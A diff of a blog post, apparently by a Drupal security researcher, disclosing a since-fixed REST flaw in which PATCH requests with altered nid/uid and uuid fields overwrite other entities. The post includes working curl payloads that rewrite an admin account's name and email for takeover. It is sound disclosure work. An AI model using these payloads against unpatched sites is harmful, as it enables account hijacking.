@@ -71,23 +71,23 @@ When I do security research on Drupal core, I tend to focus on one class of vuln
 <p>When I was trying to exploit REST previously, I was sending bad data for fields like body (XSS?), path (open redirect?), and field_image (access private files?). None of this had worked, but I started to wonder about the base fields in the response, specifically nid and uuid. What happens when you change the ID or UUID of an entity?</p>
 <p>Let’s try it out! We’re going to send a PATCH request for node 1, changing the nid and title fields in hopes of modifying another entity’s data:</p>
 <pre>
-<code class=" hljs php">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/node/1?_format=json -H 'Content-Type: application/json'</span>
--d <span class="hljs-string">'{
-      "nid":   [{"value": 2}],
-      "type":  "article",
-      "title": [{"value": "Hello world"}]
-    }'</span>
+<code class=" hljs protobuf">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/node/1?_format=json -H 'Content-Type: application/json'</span>
+-d '{
+      <span class="hljs-string">"nid"</span>:   [{<span class="hljs-string">"value"</span>: <span class="hljs-number">2</span>}],
+      <span class="hljs-string">"type"</span>:  <span class="hljs-string">"article"</span>,
+      <span class="hljs-string">"title"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"Hello world"</span>}]
+    }'
 {<span class="hljs-string">"message"</span>:<span class="hljs-string">"Unprocessable entity: validation failed.\n: The content has either been modified by another user, or you have already submitted modifications. As a result, your changes cannot be saved.\n"</span>}
 </code></pre><p>That didn’t work, so next I tried to change the UUID and NID at the same time. It would make sense that you need to pass a new UUID, as otherwise the UUID from node 1 would be used, and wouldn’t be very unique at all.</p>
 <p>Let’s try changing both:</p>
 <pre>
-<code class=" hljs php">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/node/1?_format=json -H 'Content-Type: application/json'</span>
--d <span class="hljs-string">'{
-      "nid":   [{"value": 2}],
-      "type":  "article",
-      "uuid":  [{"value": "6786fd3c-cbc9-49a0-8b07-47ed78ed052e"}],
-      "title": [{"value": "Hello world"}]
-    }'</span>
+<code class=" hljs protobuf">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/node/1?_format=json -H 'Content-Type: application/json'</span>
+-d '{
+      <span class="hljs-string">"nid"</span>:   [{<span class="hljs-string">"value"</span>: <span class="hljs-number">2</span>}],
+      <span class="hljs-string">"type"</span>:  <span class="hljs-string">"article"</span>,
+      <span class="hljs-string">"uuid"</span>:  [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"6786fd3c-cbc9-49a0-8b07-47ed78ed052e"</span>}],
+      <span class="hljs-string">"title"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"Hello world"</span>}]
+    }'
 {}
 </code></pre><p>This is interesting - an empty response was returned, and the response code was 500.</p>
 <p>This error was logged on the server:</p>
@@ -124,14 +124,14 @@ Integrity constraint violation: <span class="hljs-number">19</span> UNIQUE const
 <p>Updating arbitrary nodes is fun, but it was quickly clear that the big exploit here would be to send a PATCH request for the current user, pass the ID of an admin user, and gain access to their account.</p>
 <p>The payload was similar - in this example user 2 changes the email and name of user 1, which would then let me request a password reset and hijack the administrative user. Note that the existing password of user 2 (“password”) is provided as it’s required to change the email and name fields:</p>
 <pre>
-<code class=" hljs php">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/user/2?_format=json -H 'Content-Type: application/json'</span>
--d <span class="hljs-string">'{
-      "uid":  [{"value": 1}],
-      "uuid": [{"value": "2e9403a4-d8af-4096-a116-624710140be0"}],
-      "name": [{"value": "yougothacked"}],
-      "mail": [{"value": "yougot@hacked.com"}],
-      "pass": [{"existing": "password"}]
-    }'</span>
+<code class=" hljs protobuf">$ curl -u admin:password -X PATCH http:<span class="hljs-comment">//localhost/user/2?_format=json -H 'Content-Type: application/json'</span>
+-d '{
+      <span class="hljs-string">"uid"</span>:  [{<span class="hljs-string">"value"</span>: <span class="hljs-number">1</span>}],
+      <span class="hljs-string">"uuid"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"2e9403a4-d8af-4096-a116-624710140be0"</span>}],
+      <span class="hljs-string">"name"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"yougothacked"</span>}],
+      <span class="hljs-string">"mail"</span>: [{<span class="hljs-string">"value"</span>: <span class="hljs-string">"yougot@hacked.com"</span>}],
+      <span class="hljs-string">"pass"</span>: [{<span class="hljs-string">"existing"</span>: <span class="hljs-string">"password"</span>}]
+    }'
 </code></pre><p>It worked! Any user with access to update their profile with REST could change the email and name of any other user on the site. Once an administrative account has been hacked, attackers can, in the worst case, execute another exploit to execute remote code on the server.</p>
 <p>The Drupal security team treated this as a serious vulnerability and got a fix out quickly. The code change can be <a href="https://cgit.drupalcode.org/drupal/commit/?id=92e613a">seen here</a> - in it the ID and UUID keys can only be set when an entity is created, not when it’s updated. This was a great example of a complex problem with a simple exploit and fix.</p>
 <p>After the fix for this was released I started working with the security team as a volunteer, and am now a full member. That means I have less time to research new vulnerabilities, but am definitely not done hunting yet.</p>
